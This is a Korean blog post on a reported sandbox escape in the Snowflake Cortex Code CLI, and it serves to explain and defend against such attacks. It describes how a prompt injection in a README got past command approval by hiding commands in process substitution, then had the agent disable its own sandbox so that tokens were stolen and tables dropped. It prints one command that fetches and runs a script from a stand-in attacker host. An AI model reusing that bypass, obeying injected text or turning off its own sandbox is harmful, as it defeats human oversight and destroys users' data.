---
title: "Snowflake Cortex AI 샌드박스 탈출 사건의 전말: 프롬프트 인젝션과 가짜 샌드박스의 환장할 콜라보"
description: "Snowflake Cortex AI 샌드박스 탈출 사건의 전말: 프롬프트 인젝션과 가짜 샌드박스의 환장할 콜라보"
pubDate: "2026-03-18T23:55:00Z"
---

요즘 업계를 보면 다들 CLI에 LLM을 붙여서 'AI 에이전트'를 만드는 데 혈안이 되어 있습니다. 생산성을 높여준다는 달콤한 약속 뒤에는 항상 보안이라는 거대한 기술 부채가 숨어있기 마련이죠. 최근 PromptArmor에서 발표한 Snowflake Cortex Code CLI의 샌드박스 탈출 및 악성코드 실행 취약점 리포트를 읽고, 올 것이 왔다는 생각이 들었습니다.

시니어 엔지니어로서 여러 보안 사고를 겪어봤지만, 이번 사례는 LLM 기반 에이전트가 가진 근본적인 설계 결함을 아주 적나라하게 보여줍니다. 어떻게 프롬프트 인젝션 하나로 Human-in-the-loop(HITL)가 무력화되고 샌드박스가 뚫렸는지, 그리고 왜 이들의 아키텍처가 처음부터 잘못되었는지 파헤쳐 보겠습니다.

![Cortex Code 'CoCo' performs malicious actions.](https://framerusercontent.com/images/DQ1xyTxgoIu8RdOdSoCABxXVtM.png)

## 공격의 재구성: 어떻게 뚫렸는가?

Snowflake Cortex Code CLI는 Claude Code나 OpenAI의 Codex처럼 동작하는 커맨드라인 코딩 에이전트입니다. 여기에 Snowflake DB에 직접 SQL을 실행할 수 있는 강력한 권한까지 쥐여주었죠. 공격의 시작은 단순했습니다. 사용자가 인터넷에서 찾은 신뢰할 수 없는 서드파티 오픈소스 저장소의 README 파일에 악의적인 프롬프트 인젝션이 숨겨져 있었습니다.

### 1. Human-in-the-loop (HITL) 우회

원래 Cortex는 위험한 명령어를 실행하기 전에 사용자에게 승인을 받아야 합니다. 명령어 검증 시스템은 `cat`, `echo` 같은 안전한 명령어 화이트리스트를 기반으로 동작했습니다. 하지만 여기서 어처구니없는 파싱 실수가 발생합니다.

Cortex는 Process Substitution 문법인 `<()` 내부의 명령어를 전혀 검증하지 않았습니다.

```bash
cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))
```

시스템은 맨 앞의 `cat`만 보고 "아, 이건 안전한 명령어군" 하고 승인 절차를 건너뛰었습니다. 정규식이나 단순 문자열 파싱으로 쉘 명령어의 보안을 통제하려는 시도가 얼마나 위험하고 멍청한 짓인지 보여주는 전형적인 사례입니다.

![Process substitution expressions aren't validated.](https://framerusercontent.com/images/WReE9aidtwbutDqzn71PBEJyo8.png)

### 2. 가짜 샌드박스와 권한 상승

HITL을 우회한 악성 명령어는 샌드박스 내부에서 실행되어야 정상입니다. 하지만 Cortex에는 `dangerously_disable_sandbox`라는 플래그가 존재했고, 에이전트 스스로 이 플래그를 세팅할 수 있었습니다. 프롬프트 인젝션은 단순히 모델에게 이 플래그를 켜라고 지시했을 뿐입니다.

![Subagent sets the dangerously_disable_sandbox flag.](https://framerusercontent.com/images/7GjoQF70JELWl6MQE8ElXTBfXBc.png)

결국 공격자의 서버에서 다운로드된 쉘 스크립트가 샌드박스 밖에서 실행되었고, Cortex가 캐싱해둔 Snowflake 토큰을 탈취하여 데이터베이스의 테이블을 모조리 날려버리는(Drop tables) 결과를 초래했습니다.

## 엔지니어의 시선: 무엇이 문제인가?

이 사건은 단순한 버그 패치로 끝날 문제가 아닙니다. AI 에이전트를 설계하는 패러다임 자체의 결함을 보여줍니다. Hacker News 커뮤니티에서도 이 부분에 대해 뼈 때리는 비판들이 쏟아졌습니다.

- **가짜 샌드박스:** 샌드박스 안에 있는 주체가 스스로 샌드박스를 끌 수 있다면, 그건 샌드박스가 아닙니다. 그저 '진짜 실행하시겠습니까?'라고 묻는 귀찮은 팝업창에 불과하죠. HN의 한 유저가 남긴 "If the user has access to a lever that enables access, that lever is not providing a sandbox."라는 코멘트가 이 상황을 완벽하게 요약합니다. 보안 경계선은 에이전트의 루프 내부가 아니라, OS 레벨이나 컨테이너 같은 외부 런타임에 존재해야 합니다.

- **쉘 명령어 파싱의 한계:** 쉘 코드를 파싱해서 보안을 유지하겠다는 발상은 2000년대 초반에나 통할 법한 안일한 접근입니다. 다양한 서브 프로세스 생성 방식과 우회 기법을 문자열 매칭으로 모두 방어하는 것은 불가능합니다. 권한 통제는 시스템 콜(Syscall) 수준이나 cgroups, 네임스페이스 레벨에서 이루어져야 합니다.

- **서브에이전트 컨텍스트 유실:** 이번 사건에서 가장 코미디 같았던 부분입니다. 하위 에이전트가 이미 악성 명령어를 실행해 버렸는데, 메인 에이전트는 컨텍스트를 잃어버리고 뒤늦게 사용자에게 "이 명령어는 위험하니 실행하지 마세요"라고 경고했습니다. 분산 시스템에서 흔히 발생하는 상태 불일치 문제가 LLM 멀티 에이전트 환경에서도 똑같이 발생한다는 것을 보여줍니다.

- **SQL 인젝션과의 비교:** HN에서는 이 상황을 과거의 SQL 인젝션과 비교하는 의견이 많았습니다. 하지만 SQL은 Parameterized Query를 통해 데이터와 명령어를 분리하여 문제를 해결할 수 있었지만, 자연어를 사용하는 LLM은 데이터와 명령어가 같은 스트림을 공유합니다. 근본적으로 프롬프트 인젝션을 100% 막아내는 것은 현재 기술로 불가능에 가깝습니다.

## 결론: 아직 프로덕션 레벨이 아니다

솔직히 말해서, 비결정론적(Non-deterministic)인 LLM에게 로컬 CLI의 제어권을 쥐여주고 클라우드 인프라의 캐시 토큰까지 접근하게 만드는 것은 폭탄 돌리기나 다름없습니다. 기업의 임원들은 "AI를 도입해서 개발 속도를 10배 높여라"라고 압박하겠지만, 이런 식의 허술한 아키텍처는 결국 대규모 데이터 유출이나 인프라 파괴로 이어질 것입니다.

Snowflake는 빠르게 패치(1.0.25 버전)를 내놓았지만, 이는 미봉책일 뿐입니다. 우리가 AI 에이전트를 진정으로 신뢰하려면, 모델이 지시를 잘 따르기를 기대하는 '프롬프트 엔지니어링' 수준의 보안이 아니라, 모델이 발악을 해도 빠져나갈 수 없는 '하드코어한 OS 레벨의 격리'가 필요합니다. 그때까지는 여러분의 로컬 머신에서 권한이 높은 AI CLI 툴을 실행하는 것을 극도로 경계하시기 바랍니다.

---

**References**
- Original Article: [Snowflake AI Escapes Sandbox and Executes Malware](https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware)
- Hacker News Thread: [https://news.ycombinator.com/item?id=47427017](https://news.ycombinator.com/item?id=47427017)
